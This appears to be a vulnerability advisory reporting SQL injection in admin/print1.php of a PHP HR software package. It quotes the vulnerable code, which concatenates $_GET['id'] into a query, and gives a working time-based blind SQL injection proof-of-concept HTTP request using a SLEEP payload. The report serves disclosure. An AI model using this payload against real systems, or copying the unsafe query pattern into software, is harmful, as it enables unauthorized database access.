### Vulnerability file address

`admin/print1.php` from line 104,The `$_GET['id']` parameter is controllable and the `$_GET['id']` is not protected from sql injection, line 107 `$statement2 = $conn->prepare($sql2);` ,line 108 `$statement2->execute();`,line 108 performs a SQL query, causing SQL injection

```php
..........
..........
..........
  
  <?php 
                                                $sql2 = "SELECT * FROM quot_inv_items where inv_id='".$_GET['id']."'";
 
                
                                                 $statement2 = $conn->prepare($sql2);
                                                 $statement2->execute();
                                                     while($row2= $statement2->fetch(PDO::FETCH_ASSOC))
                                                     {
                                                
                                                           $sql1 = "SELECT * FROM tbl_product where id='".$row2['product_id']."'";
                                                 
                                                                
                                                 $statement1 = $conn->prepare($sql1);
                                                 $statement1->execute();
                                                     $row1 = $statement1->fetch(PDO::FETCH_ASSOC);
..........
..........
..........
```

### POC

```http
GET /CMS/php/_hr_soft/admin/print1.php?id=1' AND (SELECT 1442 FROM (SELECT(SLEEP(5)))PxxA)-- syeM HTTP/1.1
Host: 10.0.0.20:82
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=81293i00fqra5g881e77or40t2
Upgrade-Insecure-Requests: 1
```

### Attack results pictures

![image-20250130162257987](https://raw.githubusercontent.com/nixuchuan/imgs/main/202501301622045.png)